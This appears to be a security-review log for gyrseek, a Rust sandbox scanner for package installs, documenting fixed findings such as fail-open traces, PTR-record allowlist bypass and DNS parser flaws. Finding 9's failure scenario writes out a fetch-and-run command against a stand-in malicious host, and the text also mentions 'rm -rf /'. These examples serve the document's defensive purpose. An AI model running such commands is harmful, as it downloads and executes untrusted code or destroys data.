# Fixed Findings

### Summary

| # | File | Tag/Severity | Description | Fix/Notes | Status |
|---|------|--------------|-------------|-----------|--------|
| 1 | `sandbox.rs`:188 | Critical | Empty trace on strace failure passes as clean scan | — | ✅ Fixed |
| 2 | `scanning.rs`:199 | Critical | PTR-record domain allowlist bypassable by attacker | — | ✅ Fixed |
| 3 | `scanning.rs`:427 | High | Argv regex truncates at first `]` — corrupts signatures | — | ✅ Fixed |
| 4 | `sandbox.rs`:307 | High | `\|\| true` suppresses strace failures — root cause of #1 | — | ✅ Fixed |
| 5 | `parsing.rs`:113 | High | Poetry non-develop local-path packages leak through filter | — | ✅ Fixed |
| 6 | `parsing.rs`:298 | Medium | PEP 508 extras in package name → PyPI 404 → zero baselines | — | ✅ Fixed |
| 7 | `parsing.rs`:576 | Medium | Extras key mismatch breaks version pinning in forwarded command | — | ✅ Fixed |
| 8 | `lib.rs`:536 | Medium | Child exit status discarded — failed installs appear successful | — | ✅ Fixed |
| 9 | `lib.rs` | Medium | Unrecognized managers silently forwarded unscanned | — | ✅ Fixed |
| 10 | `scanning.rs`:654 | Critical | Self-referencing baseline override disables all anomaly detection | — | ✅ Fixed |
| 13 | `scanning.rs`:1852 | Medium | Async tests set env var without drop-guard — panic leaves it set | — | ✅ Fixed |
| 15 | `sandbox.rs`:511 | Low | Empty `GYRSEEK_*_SCANNER_IMAGE` env var used as docker image ref | — | ✅ Fixed |
| 16 | `scanning.rs`:509 | Medium | `extract_dns_map` regex missing `\s*` — never matches real strace output | — | ✅ Fixed |
| 17 | `scanning.rs`:972 | High | `-xx` strace flag hex-escapes execve argv → `is_harness_command` false positives | — | ✅ Fixed |
| 18 | `scanning.rs`:467 | Medium | `parse_dns_response` RDLEN offset reads TTL bytes instead of RDLENGTH | — | ✅ Fixed |
| 19 | `scanning.rs`:392 | High | `decode_dns_name` no cycle detection → infinite loop on circular pointer | — | ✅ Fixed |
| 20 | `sandbox.rs` / `scanning.rs`:559 / 730 | Critical | Pipe delimiter in artifact log — filename injection bypasses all artifact checks | — | ✅ Fixed |
| C2 | `lib.rs:97-274` | `shrink` | `load_policy_config` is 177 lines of trim→filter→collect for 8 list fields. | `parse_list()` helper; 5 list fields collapsed to 1-liners. | ✅ Fixed |
| C6 | `Cargo.toml:7` | `shrink` | `tokio` with `features = ["full"]` pulls in 30+ features. | `["rt", "rt-multi-thread", "macros"]` — 3 features instead of 30+. | ✅ Fixed |
| C7 | `scanning.rs:76-95` | `shrink` | `compare_version_strings` repeats the same Ok/Err/Err/Ok match on both branches. | `parse_and_cmp::<T>` generic helper unifies both arms. | ✅ Fixed |
| C8 | `scanning.rs:1009-1013` | `yagni` | `burst_triggered` has one caller (`burst_policy_warning`). | Inlined `match` at caller; tests updated to use `burst_policy_warning`. | ✅ Fixed |
| C9 | `scanning.rs:1325-1343, 1400-1415, 1440-1473` | `shrink` | Three near-identical "CRITICAL WARNING: Behavioral anomaly flagged" blocks. | `fn warn_and_block(...)` saves ~50 lines; all 3 + artifact block consolidated. | ✅ Fixed |
| C10 | `parsing.rs:648-714` | `shrink` | `parse_package_details` has 5-layer nested if/else per manager. | `match` with guards replaces 5-layer if/else chain. | ✅ Fixed |
| C14 | `sandbox.rs:662-669` | `yagni` | `docker_seccomp_profile_arg` wraps one format call. | Inline `format!("seccomp={}", path?)` at call site. | ✅ Fixed |
| C15 | `scanning.rs:1383-1391` | `shrink` | 8-line loop+flatten over two `Option<String>` refs to print warning. | `if m1.as_deref() == Some(&v_curr) \|\| m2.as_deref() == Some(&v_curr)`, 3 lines. | ✅ Fixed |
| C17 | `scanning.rs` / `parsing.rs` / `sandbox.rs` | `shrink` | 14× `Vec::new()` + push-loop that could be iterator adaptors (`.filter_map().collect()`, `.partition()`, `.filter().take().collect()`, `.map().collect()`). Most clear-cut: `parse_requirements_packages_from_content` (`parsing.rs:321`, 5 lines → 1), `select_age_eligible_baselines` (`scanning.rs:1166`, 11 lines → 3 with `.filter().take()`), and 5 allowlist-split functions that could use `.partition()` (e.g. `filter_allowlisted_new_connections` at `scanning.rs:261`, 26 lines → 6). The double-collect to reverse stdout tail lines (`sandbox.rs:345`, `.collect::<Vec<_>>().into_iter().rev().collect()`) is a standalone allocation. | Convert to iterator adaptors. | ✅ Fixed |
| 71 | `docs/FIXED_FINDINGS.md` | ``documentation`` | Drops cross-finding chain documentation from original file | Restore architectural context | ✅ Fixed |
| 73 | `docs/common_prompts.md` | ``formatting`` | Missing trailing newline | Append newline | ✅ Fixed |

---
## Cross-Finding Chains (Architectural Context)

The following chains document how independent bugs created compounded attack surfaces. Preserved here as critical threat modeling context:
- **Chain 1:** To Do #4 → Starting Code #1 (Missing capability check allowed empty traces to fail open).
- **Chain 2:** Enforce fail-closed behavior and PEP508 handling #6 → Allow only supported package manager #7 (Unrecognized managers bypassed the sandbox entirely, while malformed package names crashed the parser).
- **Chain 3:** Add CI pipeline #11 → Route lock commands to scanner and add tests #12 (Lockfile execution lacked sandbox tracing, requiring a new CI pipeline approach to detect regressions).
- **Chain 4:** Add post-install artifact scan #17 → Add EnvVarGuard and refactor run with bulk_scan #16 → Doco update #18 (Artifact scan introduced locking issues, prompting the RAII EnvVarGuard refactor to ensure panic-safety).

## Detailed Findings

### Finding 1 — Critical | `sandbox.rs:188` | ✅ Fixed

**Summary:** A missing trace log silently falls back to an empty string, which the scanner treats as a clean zero-connection trace, allowing the package.

**Root cause:** `trace_install_docker_matrix_with_runtime` reads each per-probe log file and falls back to a single-probe retry. If both fail, `unwrap_or_default()` returns `""`. An empty string produces empty `TraceSignals` (no IPs, no git-clone signatures, no process-exec signatures). The diff of empty-vs-empty produces zero anomalies → `allowed: true` with no actual tracing data.

**Failure scenario:** In a Kubernetes environment where the container seccomp profile blocks `ptrace`, strace exits non-zero and writes nothing to `/out/gyrseek_trace_N.log`. The fallback runs under the same restriction and also fails. Every package scanned in that environment silently passes.

**Chained with:** Finding 4 (the `|| true` in the matrix script is what hides the strace failure).

**Fix direction:** When both the matrix log read and the single-probe fallback fail, return `Err(...)` rather than an empty string. The error path in `scan_packages_versions` already marks all packages in the batch as blocked.

**✅ Fix status — FIXED.** Empty/whitespace traces are now a hard `Err` (fail-closed). The per-probe read prefers the matrix log only when non-empty, falls back to the single-probe call with `?` so errors propagate, and treats a blank trace as an error carrying the captured strace stderr. The single-probe fallback also checks `output.status.success()`. (`sandbox.rs:185–218`.) This change surfaced the missing `CAP_SYS_PTRACE` — see the follow-on fix note at the end of this document.

---

### Finding 2 — Critical | `scanning.rs:199` | ✅ Fixed

**Summary:** The domain allowlist is checked against the attacker-controlled PTR record of the connecting IP, allowing a C2 server to bypass the allowlist by setting its reverse-DNS to an allowlisted domain.

**Root cause:** `filter_domain_allowlisted_new_connections_with` calls `reverse_dns_domain` → `lookup_addr` on each new IP, then checks the returned hostname against `domain_allowlist`. PTR records are fully controlled by the IP's owner.

**Failure scenario:** Organization sets `domain_allowlist: ['cdn.example.com']`. Attacker registers C2 IP `1.2.3.4` and sets its PTR record to `cdn.example.com`. The malicious package connects to `1.2.3.4`. `reverse_dns_domain("1.2.3.4")` returns `"cdn.example.com"` → allowlisted → not flagged.

**Fix direction:** Resolve the PTR hostname forward and only trust it if its A/AAAA records include the original IP (FCrDNS — forward-confirmed reverse DNS).

**✅ Fix status — FIXED (FCrDNS implemented).** `reverse_dns_domain` now resolves the PTR hostname forward and only returns it if the forward resolution includes the original IP. The pure decision is extracted into `forward_confirmed_hostname` with injectable lookups for deterministic testing. (`scanning.rs:213–240`; tests `fcrdns_accepts_hostname_that_forward_resolves_back_to_ip`, `fcrdns_rejects_spoofed_ptr_that_does_not_forward_confirm`, `fcrdns_rejects_when_no_ptr_record`.)

---

### Finding 3 — High | `scanning.rs:427` | ✅ Fixed

**Summary:** The execve argv regex `[^\]]*` stops at the first `]` in any argument, silently truncating arguments that contain `]` — such as PEP 508 package extras or bracket-containing paths.

**Root cause:** The character class `[^\]]*` matches everything except `]`. strace output for `execve("/bin/pip", ["pip", "install", "requests[security]"], ...)` has the `]` in `security]` terminate the argv capture early. The extracted argv becomes `"pip", "install", "requests[security` — the last argument is malformed.

**Failure scenario (false positive):** A package clones `https://host/path[mirror]` — the URL truncates, the extracted git-clone signature never matches the `git_clone_allowlist` entry → false-positive block.

**Failure scenario (bypass):** A package runs `bun run script[obf].js`. Both current and baseline produce the truncated signature `bun|run|script[obf` → diffs are equal → no anomaly → bypass.

**Fix direction:** Use a balanced-bracket-aware pattern that can consume `[...]` spans inside the argv group.

**✅ Fix status — FIXED.** The argv capture group is now:
```
[^\[\]]*(?:\[[^\]]*\][^\[\]]*)*
```
This consumes any number of balanced `[...]` spans before the real closing `]`. (`scanning.rs:457`; test `extract_process_exec_preserves_brackets_in_argv`.)

---

### Finding 4 — High | `sandbox.rs:307` | ✅ Fixed

**Summary:** The matrix script appends `>/dev/null 2>&1 || true` to each strace invocation, discarding strace's stderr and masking its exit code, so ptrace capability failures produce an empty log file with no diagnostic.

**Root cause:** `build_matrix_script` wraps each strace call with `>/dev/null 2>&1 || true`. When strace cannot attach (e.g. `CAP_SYS_PTRACE` missing), it writes an error to stderr and exits non-zero — both are now invisible. Docker exits 0. No log is written. The caller cannot distinguish this from a clean install that made no network calls.

**Failure scenario:** Direct cause of Finding 1. Any environment blocking ptrace will have every scan silently pass.

**Fix direction:** Capture strace's stderr to a per-probe log file rather than discarding it. Keep `|| true` only for the install subprocess's exit code, not for the strace wrapper.

**✅ Fix status — FIXED (with deliberate deviation).** strace's stderr is now captured to `/out/gyrseek_err_N.log` per probe (`2>err_log`) instead of `/dev/null`. `|| true` is kept so a single failing baseline install (e.g. yanked version, transient network error) does not abort sibling probes — since strace exits with the tracee's exit code, not its own. A genuine strace-attach failure leaves a blank trace log, which Finding 1's empty-trace check turns into a block carrying the captured stderr for diagnosis. (`sandbox.rs:330–339`; test `matrix_script_captures_strace_stderr_not_devnull`.)

---

### Finding 5 — High | `parsing.rs:113` | ✅ Fixed

**Summary:** The poetry lock parser only excludes `develop=true` directory-source entries; non-develop local-path packages pass through and are submitted to the registry scanner as public packages.

**Root cause:** The exclusion condition was `if !*local_source && !(directory_local && *develop)`. A non-develop local directory package has `develop=false`, so `!(directory_local && false)` = `!false` = `true` → the package is pushed to the scan list.

**Failure scenario:** A `poetry.lock` entry has `[package.source]` with `type = "directory"` and `url = "../mylib"` but no `develop` key (defaults to `false`). `mylib` is submitted to the PyPI scanner. If a public package named `mylib` exists, gyrseek scans and approves it — but the actual install uses the local path, making the approval meaningless.

**Fix direction:** Exclude any local directory-source package regardless of the `develop` flag: `if !*local_source && !directory_local`.

**✅ Fix status — FIXED exactly as suggested.** The condition is now `if !*local_source && !directory_local`. The now-unused `develop` variable and its plumbing were removed. (`parsing.rs:116`; tests `skips_non_develop_local_package_from_poetry_lock` and `skips_develop_local_package_from_poetry_lock`.)

---

### Finding 6 — Medium | `parsing.rs:298` | ✅ Fixed

**Summary:** PEP 508 extras (e.g., `requests[security]`) are preserved in the package name after `split_once("==")`, causing the PyPI registry lookup to 404 and leaving the package with zero baselines.

**Root cause:** `parse_requirements_spec` splits on `==` but does not strip the extras from the name half. `requests[security]==2.31.0` yields `name = "requests[security]"`. The PyPI URL becomes `https://pypi.org/pypi/requests[security]/json` — a 404. The function falls back to zero baselines, zero burst count, no release-age data. With zero baselines the scan runs against an empty set, so any connection (including to pypi.org itself) is flagged as new.

**Failure scenario:** A `requirements.txt` with `requests[security]==2.31.0` causes every scan to block on a spurious "new connection to pypi.org" anomaly, since the empty baseline has no known-good traffic.

**Chained with:** Finding 7 — the extras mismatch also breaks version pinning.

**Fix direction:** Strip extras from the canonical name before any registry lookup or `pins` key.

**✅ Fix status — FIXED.** A shared `strip_pep508_extras(name) -> &str` helper (splits on the first `[`) is applied at every parse boundary that feeds a registry lookup or the `pins` key. `requests[security]==2.31.0` now parses to canonical name `requests`; the PyPI URL is valid; the original spec with extras is preserved for the forwarded install command. (`parsing.rs:291`, applied at `295–312` and `645–651`; tests `strip_pep508_extras_removes_bracket_suffix` and `strips_pep508_extras_from_requirements_name`.)

---

### Finding 7 — Medium | `parsing.rs:576` | ✅ Fixed

**Summary:** `rewrite_args_with_pinned_versions` strips extras before looking up the package in the `pins` map, but `pins` is keyed by the full name including extras, so the lookup misses and the install is forwarded unpinned.

**Root cause:** The `pins` map was keyed by the full parser output — `requests[security]` — but the rewrite function looked up `requests` (after stripping extras). `pins.get("requests")` returns `None` → the argument is forwarded as the original unpinned spec, reopening the TOCTOU gap.

**Failure scenario:** `pip install requests[security]` is scanned at `2.31.0`. A malicious `2.32.0` is published before the forwarded install runs. The forwarded command is `pip install requests[security]` (unpinned) → pip resolves `2.32.0` → installed.

**Fix direction:** Normalize `pins` keys and the rewrite lookup to use the same canonical (extras-stripped) name, re-emitting the full spec with extras when building the pinned argument.

**✅ Fix status — FIXED via canonical keying (coordinated with #6).** Because #6 strips extras at parse time, `pins` is now keyed by `requests`. The rewrite looks up with `strip_pep508_extras(arg)` and re-emits `arg==version` (full spec with extras intact): `requests[security]==2.31.0`. (`parsing.rs:583`; test `pins_extras_spec_using_canonical_key_and_preserves_extras`.)

---

### Finding 8 — Medium | `lib.rs:536` | ✅ Fixed

**Summary:** The child process exit status is discarded — if the host package manager exits non-zero, gyrseek exits 0 and misreports a failed install as successful.

**Root cause:** `forward_args` called `let _ = child.wait()`, discarding the `ExitStatus`.

**Failure scenario:** An AI agent runs `gyrseek npm install nonexistent@99.0.0`. gyrseek scans (clean), forwards to npm. npm exits 1. gyrseek exits 0. The agent assumes the install succeeded and continues, producing broken builds blamed on unrelated code.

**Fix direction:** Match on `child.wait()`, propagate a non-zero status with `std::process::exit`, and fail closed if `wait()` itself errors.

**✅ Fix status — FIXED.** `forward_args` now propagates the host manager's exit code. (`lib.rs:540–550`; integration tests `forwarding_propagates_host_nonzero_exit_status` and `forwarding_preserves_host_success_exit_status` in `tests/forward_fail_closed_tests.rs`.)

---

### Finding 9 — Medium | `lib.rs` | ✅ Fixed

**Summary:** Unrecognized managers were silently forwarded unscanned, violating gyrseek's core contract.

**Root cause:** The `run()` fallback called `forward_original_command()` for any manager that `should_enforce_package_detection` returned `false` for — which includes every unrecognized command. `gyrseek ls`, `gyrseek curl https://...`, and `gyrseek rm -rf /` all executed unscanned.

**Failure scenario:** A misconfigured CI pipeline uses `gyrseek curl https://malicious.example/bootstrap.sh | sh`. gyrseek forwards it silently and exits 0 — no scan, no warning, full false assurance.

**Fix direction:** Add an upfront allowlist check before sandbox init. Any manager not in `["pip", "pip3", "uv", "poetry", "npm"]` (except `sandbox runtimes`) should exit 1 with a clear message.

**✅ Fix status — FIXED.** `SUPPORTED_MANAGERS` allowlist added at `lib.rs:769` (later expanded to include `pnpm`). Unrecognized managers exit 1 with:
```
❌ [gyrseek] Unrecognized manager 'curl'. Supported managers: pip, pip3, uv, poetry, npm, pnpm. Failing closed.
```

---

### Finding 10 — Critical | `scanning.rs:654` | ✅ Fixed

**Summary:** `select_effective_baselines` inserts baseline override versions without checking equality to `current`; a self-referencing override disables all anomaly detection for the affected package.

**Root cause:** The `v != current` guard on line 666 only applies to versions pulled from `fetched_baselines`. The override insertion block (lines 654–660) unconditionally pushes `override_m1` and `override_m2` regardless of value. When an override version equals the version being scanned, the sandbox deduplicates the current + baseline probes to a single run. `current_signals.difference(baseline_signals)` is always empty — every signal type returns no anomalies → `allowed: true`.

**Failure scenario:** Config: `baseline_overrides: {evil-pkg: {baseline-1: "1.3.0"}}`. User installs `evil-pkg@1.3.0` (same version). `select_effective_baselines` returns `["1.3.0"]` as the baseline. Probe deduplication collapses to one trace run. All diffs are empty → `allowed: true`, regardless of what `1.3.0` actually does during install.

**Note:** This is a configuration footgun, not a remote exploit.

**Fix direction:** Add a `v != current` guard to the override insertion block (lines 654–660), matching the guard already applied to `fetched_baselines` on line 666. Emit a `⚠️ [gyrseek]` warning when a configured override version equals the version being scanned.

**✅ Fix status — FIXED.** Added `v != *current` guard to both override insertion paths in `select_effective_baselines` (`scanning.rs:1133–1140`). Added warning at the call site in `scan_packages_versions` (`scanning.rs:1384–1393`) that prints `⚠️ [gyrseek] Baseline override version 'X' for 'pkg' equals the version being scanned; ignoring (would disable all anomaly detection)`. Updated test from `override_equal_to_current_is_included_as_baseline_producing_empty_diff` to `override_equal_to_current_is_excluded_from_baselines` — the override is now excluded and the fetched baseline fills the slot.

---

### Finding 13 — Medium | `scanning.rs:1852` | ✅ Fixed

**Summary:** Async scan tests set/remove an env var with bare `unsafe` calls and no drop-guard; a panic between the two leaves the var set and may poison the shared `Mutex`, masking the real failure with cascade lock-poison panics.

**Root cause:** The `env_lock` `OnceLock<Mutex<()>>` serialises env-var access across async tests, but `GYRSEEK_TEST_FORCE_RELEASES_LAST_24H` is set and removed with bare `unsafe` calls bracketing the async work. If an assertion panics after `set_var` but before `remove_var`, the Mutex may be poisoned. Every subsequent `env_lock().lock().expect("env lock")` then panics with `PoisonError`.

**Failure scenario:** An assertion in `flags_newly_introduced_bun_execution` fails after `set_var`. Mutex poisoned. Next test calls `env_lock().lock().expect("env lock")` → panics. Test output shows 6 misleading lock-poison failures masking the one real assertion failure.

**Fix direction:** Wrap the env-var cleanup in a RAII drop-guard:
```rust
struct EnvGuard(&'static str);
impl Drop for EnvGuard {
    fn drop(&mut self) { unsafe { std::env::remove_var(self.0) } }
}
```

**✅ Fix status — FIXED (RAII guard that also holds the lock).** A single `EnvVarGuard` now owns both concerns: `EnvVarGuard::set(key, "0")` acquires `env_lock`, sets the var, and stores the `MutexGuard`; `Drop` removes the var. Because the guard is bound to a `let _env = …` at the top of each test, the lock is held for the **entire** test body — including the scan `.await` that reads the var — so cross-test serialization is preserved (an intermediate fix that released the lock during the await would have reintroduced the race). `Drop` runs on panic, so a failing assertion can never leave the var set, and the lock is acquired with `unwrap_or_else(|p| p.into_inner())` so a panicking test does not cascade `PoisonError` into every subsequent test. (`scanning.rs`; all 8 affected tests converted, `env_lock` retained and used by the guard.)

---

### Finding 15 — Low | `sandbox.rs:511` | ✅ Fixed

**Summary:** Empty `GYRSEEK_*_SCANNER_IMAGE` env var is treated as a valid Docker image reference, producing an "invalid reference format" error from the Docker CLI.

**Root cause:** `scanner_image_config` used `std::env::var(image_var).unwrap_or_else(|_| default_image)`. When the env var is set to `""` (empty string), `std::env::var` returns `Ok("")`, so `unwrap_or_else` is not reached — the empty string is passed directly to Docker.

**Failure scenario:** A CI pipeline sets `GYRSEEK_NPM_SCANNER_IMAGE: ""` (intending "use default"). The Docker CLI receives an empty image name and exits with "invalid reference format". The scan path treats this as a sandbox failure and blocks the install — correct behaviour (fail-closed) for the wrong reason (Docker parse error, not a meaningful block).

**Fix direction:** Filter out empty strings after the `Option` conversion: `.ok().filter(|v| !v.is_empty())`.

**✅ Fix status — FIXED as suggested.** (`sandbox.rs:515–518`; test `empty_scanner_image_env_falls_back_to_default`.)

---

### Finding 16 — Medium | `scanning.rs:509` | ✅ Fixed

**Summary:** The `extract_dns_map` regex matches `recvfrom` arguments with `",\d+,\d+,\{` but strace output inserts spaces after commas (e.g. `", 1024, 0, {sa_family..."`), so the regex never matches real strace output and DNS interceptor data is always empty in production.

**Root cause:** The regex literal `",\d+,\d+,\{[^}]*\bsin_port=htons\(53\)` requires digits immediately after each comma with no whitespace flexibility. Linux strace separates multi-argument syscalls with `, ` (comma + space). The existing test `extract_dns_map_malformed_payload_skipped` passed for the wrong reason: the malformed payload would be rejected by `parse_dns_response` regardless of match, so the empty-map assertion was trivially satisfied even when the regex didn't fire.

**Failure scenario:** Any real strace trace with DNS responses is silently ignored. The DNS interceptor fallback is an unreachable code path in production. CDN rotations without PTR records (e.g. Fastly, Cloudflare) are flagged as anomalous — the original known-limitation gap described in the old test `domain_aware_diff_cdn_rotation_without_ptr_is_known_limitation`.

**Fix direction:** Change `",\d+,\d+,\{` to `",\s*\d+,\s*\d+,\s*\{` to tolerate optional whitespace after commas.

**✅ Fix status — FIXED as suggested.** (`scanning.rs:509`; end-to-end test `dns_interceptor_end_to_end_with_realistic_strace_trace` now validates the full pipeline with a realistic trace containing spaces. Also retroactively validates the previously-nonfunctional test `extract_dns_map_malformed_payload_skipped` — it now genuinely exercises the regex match path.)

---

### Finding 17 — High | `scanning.rs:972` | ✅ Fixed

**Summary:** Adding `-xx` to strace flags for DNS wire-format capture inadvertently hex-escapes all execve argv strings (e.g. `/usr/local/bin/python` → `\x2f\x75\x73\x72...`), so `is_harness_command` cannot recognise harness commands and every sandbox probe produces spurious Shai-Hulud process-execution anomalies.

**Root cause:** `extract_process_exec_signatures` passes the raw hex-escaped argv from the strace trace directly to `executable_basename` and `is_harness_command`. `executable_basename` uses `rsplit('/')` to find the base name — but the hex-escaped path `\x2f\x75\x73\x72...` has no literal `/`, so `rsplit` returns the whole hex string as a single token. `is_harness_command` matches against literal names like `"uv"`, `"npm"`, `"python"`, `"env"` — none of which match the hex form. Every install+postinstall command leaks through as a "newly introduced process execution" anomaly.

**Failure scenario:** Every `just test-uv`, `just test-pip`, `just test-npm`, etc. run fails on a Shai-Hulud block reporting hex-escaped signatures for every harness command (`uv pip install black==26.5.1`, `env HOME=/work uv pip install ...`, `python -I -B -c import sys;...`), even when the same commands are present in baseline traces.

**Chained with:** Findings 16, 18. The `-xx` flag was added for DNS interceptor support (itself non-functional due to Finding 16). Neither the DNS parser nor exec signatures were updated to handle the `-xx` hex-escape format until this fix.

**Fix direction:** Unescape hex-escaped argv strings before passing to `executable_basename` and `is_harness_command`. Reuse `unescape_strace_string` (already written for DNS parser) on each argv element.

**✅ Fix status — FIXED.** `extract_process_exec_signatures` now unescapes each argv element via `String::from_utf8_lossy(&unescape_strace_string(a))` before building the signature. (`scanning.rs:975–981`.)

---

### Finding 18 — Medium | `scanning.rs:467` | ✅ Fixed

**Summary:** `parse_dns_response` reads the DNS answer RDLENGTH field at the wrong offset (last 2 bytes of TTL instead of bytes 8–9 past the NAME pointer), producing an incorrect RDATA length and potentially missing A/AAAA records.

**Root cause:** After skipping the NAME compression pointer (`offset += 2`), the remaining answer record header is:
- TYPE (2 bytes, offset+0)
- CLASS (2 bytes, offset+2)
- TTL (4 bytes, offset+4)
- RDLENGTH (2 bytes, offset+8)

The code read `rdlen` from `raw[offset + 6]` and `raw[offset + 7]` — which are the last two bytes of TTL — and advanced `offset += 8` instead of `offset += 10`. RDLENGTH is at `raw[offset + 8]` and `raw[offset + 9]`, and the correct advance is 10 bytes.

**Failure scenario:** A DNS response with a large TTL value (e.g. TTL = 300 = `0x0000012c`) causes `rdlen` to be read as `0x012c` = 300 instead of the actual RDATA length (typically 4 for A, 16 for AAAA). The subsequent `offset += rdlen` jumps far past the packet boundary, corrupting parsing of all subsequent answers. With TTL = 0 (`0x00000000`), `rdlen` is `0x0000` = 0 and the RDATA is never consumed, also corrupting subsequent answers.

**Note:** The existing unit tests `parse_dns_response_a_record` and `parse_dns_response_aaaa_record` used crafted payloads whose TTL value (300) happened to produce an incorrect RDLEN that still satisfied the match and did not overflow the packet in those specific single-answer cases. The multi-answer case would always fail.

**Fix direction:** Change the offset reads: `raw[offset + 8]`, `raw[offset + 9]` for RDLEN, and `offset += 10` for the advance.

**✅ Fix status — FIXED as suggested.** (`scanning.rs:467–469`; the existing single-answer tests now exercise the correct offset path; multi-answer parsing is implicitly fixed but not independently tested.)

---

### Finding 19 — High | `scanning.rs:392` | ✅ Fixed

**Summary:** `decode_dns_name` has no cycle detection for DNS compression pointers. A crafted DNS response with a self-referencing or circular pointer chain causes an infinite loop, hanging the scanner.

**Root cause:** The function uses a `loop { ... }` with only an OOB guard. Each iteration either advances through a normal label, terminates at root (`\x00`), or follows a compression pointer (`0xc0` prefix). There is no count limiting how many pointers can be followed, so a self-referencing pointer (e.g. `\xc0\x00` at offset 0 targeting offset 0) or a short cycle (e.g. offset 0→2→0) spins forever.

**Attack scenario:** An attacker who controls a domain whose DNS response, when rendered through strace `-xx` hex-escape format, produces bytes forming a circular compression pointer, can cause gyrseek to hang indefinitely when `extract_dns_map` calls `parse_dns_response` → `decode_dns_name`. This is a denial-of-service vector against the scanning pipeline.

**Fix direction:** Track the number of compression pointer hops and return `None` once a reasonable limit is exceeded. RFC 1035 permits at most 255 total bytes in a name; each compression pointer saves at least 1 byte, so 5 hops is more than enough for any legitimate name.

**✅ Fix status — FIXED.** Added `pointer_count` that increments on each pointer hop. Returns `None` when `pointer_count > 5`. (`scanning.rs:402–407`; tests `decode_dns_name_circular_pointer_returns_none`, `decode_dns_name_long_but_not_circular_pointer_chain`, `decode_dns_name_excessive_pointer_hops_returns_none`.)

---

## Review history

### Round 1 — 2026-06-09

Initial static review of `sandbox.rs`, `scanning.rs`, `parsing.rs`, `lib.rs`. Produced findings #1–8.

**Verification (against HEAD `7a6d073`):** All 8 findings confirmed accurate. Caveat on #6: the downstream outcome of zero baselines is a silent skip-and-allow for unexempted packages (not always a false-positive block as originally stated — arguably worse). Findings #1 and #4 are one bug expressed as root cause + effect.

### Round 1 fixes — 2026-06-09

All 8 findings fixed with co-located regression coverage. See individual fix notes above.

**Follow-on environment fix (surfaced by #1/#4):** Once #1 made tracing failures fail closed, real runs began blocking with `strace: ptrace(PTRACE_SEIZE): Operation not permitted`. Root cause: the sandbox container ran without `CAP_SYS_PTRACE`. Because strace drops the install to the unprivileged `gyrseek` user (`strace -u`), cross-UID attach requires this capability, which Docker does not grant by default. The old code hid this by treating empty traces as clean. Fixed by adding `--cap-add SYS_PTRACE` to the container run args (`sandbox.rs:376–377`; test `docker_args_grant_sys_ptrace_capability`). The capability is scoped to the container's PID namespace and cannot trace host processes.

### Round 1 runtime verification — 2026-06-10, `GYRSEEK_SANDBOX=docker`

All 8 fixes independently verified against the built binary. Key observations:

| # | Verification method | Result |
|---|---|---|
| 1 | Live docker scan (`npm install lodash`) — real strace trace, clear report | ✅ |
| 2 | FCrDNS unit tests (3 tests) | ✅ 3 passed |
| 3 | `extract_process_exec_preserves_brackets_in_argv` | ✅ 1 passed |
| 4 | `matrix_script_captures_strace_stderr_not_devnull` | ✅ 1 passed |
| 5 | `poetry install` with `../mylib` + `requests` in lockfile — only 1 package scanned | ✅ |
| 6 | `pip install 'requests[security]==2.31.0'` — registry lookup for `requests`, valid baselines | ✅ |
| 7 | `pins_extras_spec_using_canonical_key_and_preserves_extras` | ✅ 1 passed |
| 8 | Binary exits 1 on failed install, exits 0 on success | ✅ |
| 9 | `gyrseek ls`, `curl`, `rm` all rejected; `sandbox runtimes` and real scans unaffected | ✅ |

### Round 2 — 2026-06-10

Review of `Fixing-findings` branch (test inlining, visibility reduction, coverage-gap tests, `is_non_registry_npm_spec` CLI fix, `uv lock -P` idx fix). Produced findings #10–14.

### Round 3 — 2026-06-11 — external LLM (ChatGPT) Rust-idiom review, assessed

An external "is this idiomatic Rust?" review was run (by ChatGPT) and the verdict cross-checked against the actual tree. **Meta-conclusion: treat it as a checklist of things to verify, not a verdict.** The review hedged throughout ("I infer", "likely", "appears") and its most confident structural claims were contradicted by the code — it reviewed an imagined version of the codebase. No new security/correctness defects were produced. Recorded here so the same generic points are not re-litigated.

**Wrong (contradicted by the code):**

- *"Likely no trait abstraction for sandbox/scanner."* False. `src/sandbox.rs:11` defines `trait SandboxRunner` with a `trace_install_matrix` default method; `build_runner_from_env` returns `Box<dyn SandboxRunner>` and scan fns take `&dyn SandboxRunner` — exactly the mockable/swappable abstraction it asked for. The knowledge-graph build (2026-06-11) independently lists every `implements` edge: `DockerRunner`, `HostRunner`, `MicroVmRunner` → `SandboxRunner` (production) plus `NoopRunner` and `MockRunner` → `SandboxRunner` (test doubles). Five implementors and a dyn-dispatch boundary — the codebase is already doing the mocking ChatGPT proposed as a future benefit.
- *"Heavy `unwrap()`, crashes on failure."* Misleading. Of 23 `unwrap()`s, every non-test one is on a compile-time-constant regex inside a `OnceLock` initializer (idiomatic) or guarded (`package.unwrap()` at `lib.rs:1238` sits immediately after an `is_none()` early-return). The rest are in `#[cfg(test)]`. The real strategy is `Result<_, String>` propagated to `run()`, which prints + `process::exit`.
- *"Fail closed, not panic" presented as a missing improvement.* The code already fails closed everywhere (unknown manager, empty package set, sandbox init failure, blocked scan, un-spawnable host command) — it is the dominant design principle, see this document and findings #1, #8, #9.
- *"`forward_args` loses observability / returns no structured result."* It deliberately propagates the host manager's exit code (`lib.rs:626–628`, finding #8) — the opposite of the careless side-effect described.

**Wrong about Rust idiom for *this* domain (generic rules misapplied to a transparent passthrough wrapper):**

- *"Use clap."* clap parses your *own* CLI surface; gyrseek's job is to NOT parse the wrapped command — it strips its own `--config` then forwards everything else verbatim to npm/pip/uv. clap would fight that. The manual `parse_global_options` (stops at first non-global arg) is the correct approach.
- *"`enum PackageManager` instead of string match."* Marginal. The manager string must round-trip unchanged to `Command::new(&self.manager)`; it is fundamentally a passthrough value. Compile-time safety on ~5 branches vs an added conversion layer — defensible either way, not the clear win claimed.
- *"Stringly-typed packages / no decision object / use semver everywhere."* `semver` is already a dependency and used in `scanning.rs`; Python packages use PEP 440 (`pep440_rs`, also a dep). Forcing every version through `semver::Version` would break Python. String-at-the-boundary is deliberate. The graph also surfaces the very "decision object" the review said was missing: `ScanReport { allowed, resolved_version }` (`scanning.rs:71`) and the single `PolicyConfig` struct (`scanning.rs:16`, with a `PolicyConfig --implements--> Default` edge) — both referenced by all scan-cache consumers rather than positional args. ROADMAP records this as a completed refactor ("Folded policy knobs into a single PolicyConfig struct and scan results into ScanReport"), i.e. a move *away from* the shape ChatGPT claims is still present. A `Package` struct would read better, granted.
- *"Overuse of cloning."* Self-admitted non-finding ("performance impact is small").

**Legitimate (generic but worth acting on) — the only parts of the review with value:**

